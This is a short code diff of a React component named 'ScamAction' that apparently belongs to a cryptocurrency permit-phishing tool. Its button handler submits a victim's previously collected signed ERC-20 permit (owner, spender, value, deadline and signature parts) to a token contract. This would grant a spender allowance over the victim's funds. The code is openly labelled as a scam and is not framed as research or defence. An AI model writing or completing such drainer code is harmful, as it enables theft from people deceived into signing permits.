@@ -1,26 +1,29 @@
 'use client';
 
 import {SignedPermitSignature} from "@/app/scam/page";
+import { callContractMethod } from "../page";
+import {CustomContract} from "@/app/TokenList";
 
 const ScamAction = (props: {
 	data: SignedPermitSignature
 }) => {
+	const {data} = props;
 	return (
 		<div>
 			<button onClick={()=>{
+
 				callContractMethod('permit', [
-						account.address,
-						developer.address,
-						signature.permit.value,
-						signature.permit.deadline,
-						signature.v.toString(),
-						"0x"+signature.r.toString('hex'),
-						"0x"+signature.s.toString('hex'),
+						data.permit.owner,
+						data.permit.spender,
+						data.permit.value,
+						data.permit.deadline,
+						data.v,
+						data.r,
+						data.s,
 						{
 							gasLimit: 1000000
 						}
-					],token.contract_address,
-					//@ts-ignore
+					],CustomContract.ETH,
 					provider.connection.url+"")
 					.catch((e)=>{
 						alert(`ERROR ${e?.message ?? e}`);
